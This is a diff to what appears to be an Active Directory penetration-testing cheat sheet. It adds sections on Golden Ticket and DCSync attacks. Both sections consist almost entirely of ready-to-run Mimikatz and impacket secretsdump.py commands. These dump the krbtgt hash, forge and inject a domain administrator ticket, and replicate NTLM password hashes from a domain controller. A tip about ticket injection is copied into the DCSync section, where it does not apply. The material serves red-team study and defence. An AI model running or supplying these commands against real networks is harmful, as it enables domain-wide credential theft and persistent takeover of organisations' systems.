@@ -18,6 +18,8 @@ Active Directory follows a clear hierarchy, from top to bottom. In that hierarch
       - [Remote Desktop Protocol](#remote-desktop-protocol)
       - [Kerberoast (Service Account Attacks)](#kerberoast-service-account-attacks)
       - [Password Spray Attack (Low and Slow Password Guessing)](#password-spray-attack-low-and-slow-password-guessing)
+      - [Golden Ticket Attack](#golden-ticket-attack)
+      - [DCsync Attack](#dcsync-attack)
 
 ### Enumeration
 
@@ -324,3 +326,44 @@ xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-i
   - [Spray](https://github.com/Greenwolf/Spray)
   - [Spray-Passwords](https://github.com/ZilentJack/Spray-Passwords)
 
+#### Golden Ticket Attack
+  ```
+  #Execute mimikatz on DC as DA to grab krbtgt hash:
+  Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>
+
+  #On any machine:
+  Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:
+  <HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+  secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
+  ```
+  **Tip:** \
+  /ptt -> inject ticket on current running session\
+  /ticket -> save the ticket on the system for later use
+  
+
+#### DCsync Attack
+  ```
+  #DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
+  Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'
+  
+  #DCsync using secretsdump.py from impacket with NTLM authentication
+  secretsdump.py <Domain>/<Username>:<Password>@<DC'S IP or FQDN> -just-dc-ntlm
+  
+  #DCsync using secretsdump.py from impacket with Kerberos Authentication
+  secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
+  ```
+  **Tip:** \
+  /ptt -> inject ticket on current running session \
+  /ticket -> save the ticket on the system for later use
+  
+  
+
+Cached Credential Storage and Retrieval
+Service Account Attacks (Kerberoast)
+Low and Slow Password Guessing (Password Spray Attack)
+Pass the Hash
+Overpass the Hash
+Pass the Ticket (Silver Ticket)
+Distributed Component Object Model
+Golden Tickets
